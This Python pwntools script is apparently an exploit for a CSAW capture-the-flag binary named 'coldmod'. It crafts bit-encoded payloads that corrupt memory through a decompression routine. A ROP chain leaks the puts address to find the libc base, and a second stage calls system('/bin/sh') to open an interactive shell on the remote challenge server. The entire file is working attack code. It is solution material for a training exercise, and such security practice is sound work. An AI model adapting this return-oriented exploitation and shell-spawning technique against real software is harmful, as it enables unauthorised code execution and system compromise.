#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn.chal.csaw.io', 5005
binary = './coldmod'
brkpts = '''
b *0x000055555555659a
b *0x0000555555556298
b decompress
c
'''

elf = ELF("cold")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    if sys.argv[1] == '-r':
        io = remote(remote_ip, port)
        context.noptrace = True
    else:
        io = gdb.debug(binary, brkpts)

else:
    io = process(binary)

def fix(payload):
    out = ""
    while len(payload) % 8 != 0:
        payload += '0'
    for i in range(0, len(payload), 8):
        out += chr(int("0b"+payload[i:i+8][::-1], 2))
    return out

def get_bits(i, size):
    assert i <= (2**(size+1) - 1)
    return bin(i)[2:].rjust(size, '0')

if __name__ == "__main__":
    payload = ""
    payload += get_bits(15, 20) # length
    # val += 15
    payload += get_bits(4, 3)
    payload += get_bits(15*8-1, 16)
    # copy
    payload += get_bits(3, 3)
    payload += get_bits(0x1d*8, 10) # index
    payload += get_bits(4*8, 10) # len

    # val += 0x3d -> return address
    payload += get_bits(4, 3)
    payload += get_bits(0x3d*8+1, 16)

    # pop rdi
    # append byte
    payload += get_bits(2, 3)
    payload += get_bits(0xae, 8)
    # append bits (0011)
    payload += get_bits(1, 3)
    payload += get_bits(1, 1)
    payload += get_bits(1, 3)
    payload += get_bits(1, 1)
    payload += get_bits(1, 3)
    payload += get_bits(0, 1)
    payload += get_bits(1, 3)
    payload += get_bits(0, 1)
    # copy
    payload += get_bits(3, 3)
    payload += get_bits(0x18*8, 10) # index
    payload += get_bits(64-12, 10) # len

    # puts got
    # append byte (0xa0)
    payload += get_bits(2, 3)
    payload += get_bits(0xa0, 8)
    # append byte (0xb0)
    payload += get_bits(2, 3)
    payload += get_bits(0xb0, 8)
    # copy
    payload += get_bits(3, 3)
    payload += get_bits(0x20*8, 10) # index
    payload += get_bits(64-16, 10) # len

    # puts plt
    # append byte (0x140)
    payload += get_bits(2, 3)
    payload += get_bits(0x40, 8)
    # append bits (0001)
    payload += get_bits(1, 3)
    payload += get_bits(1, 1)
    payload += get_bits(1, 3)
    payload += get_bits(0, 1)
    payload += get_bits(1, 3)
    payload += get_bits(0, 1)
    payload += get_bits(1, 3)
    payload += get_bits(0, 1)
    # copy
    payload += get_bits(3, 3)
    payload += get_bits(0x28*8, 10) # index
    payload += get_bits(64-12, 10) # len

    # main
    # append byte
    payload += get_bits(2, 3)
    payload += get_bits(0xd0, 8)
    # append bits (0011)
    payload += get_bits(1, 3)
    payload += get_bits(1, 1)
    payload += get_bits(1, 3)
    payload += get_bits(1, 1)
    payload += get_bits(1, 3)
    payload += get_bits(0, 1)
    payload += get_bits(1, 3)
    payload += get_bits(0, 1)
    # copy
    payload += get_bits(3, 3)
    payload += get_bits(0x30*8, 10) # index
    payload += get_bits(64-12, 10) # len

    payload = fix(payload)
    sa("buffer:\n", payload)

    reu("Output: \n")
    libc.address = uu64(rl().strip()) - libc.symbols['puts']

    payload = ""
    payload += get_bits(15, 20) # length
    # val += 15
    payload += get_bits(4, 3)
    payload += get_bits(15*8-1, 16)
    # copy
    payload += get_bits(3, 3)
    payload += get_bits(0x1d*8, 10) # index
    payload += get_bits(4*8, 10) # len

    # val += 0x3d -> return address
    payload += get_bits(4, 3)
    payload += get_bits(0x3d*8+1, 16)

    binsh = next(libc.search("/bin/sh"))
    system = libc.symbols['system']
    pop_rdi = libc.address + 0x27f75

    for i in range(8):
        payload += get_bits(2, 3)
        payload += get_bits((pop_rdi >> (8*i)) & 0xff, 8)
    
    for i in range(8):
        payload += get_bits(2, 3)
        payload += get_bits((binsh >> (8*i)) & 0xff, 8)
    
    for i in range(8):
        payload += get_bits(2, 3)
        payload += get_bits((system >> (8*i)) & 0xff, 8)

    # gdb.attach(io, brkpts)

    payload = fix(payload)
    sa("buffer:\n", payload)
    io.interactive()
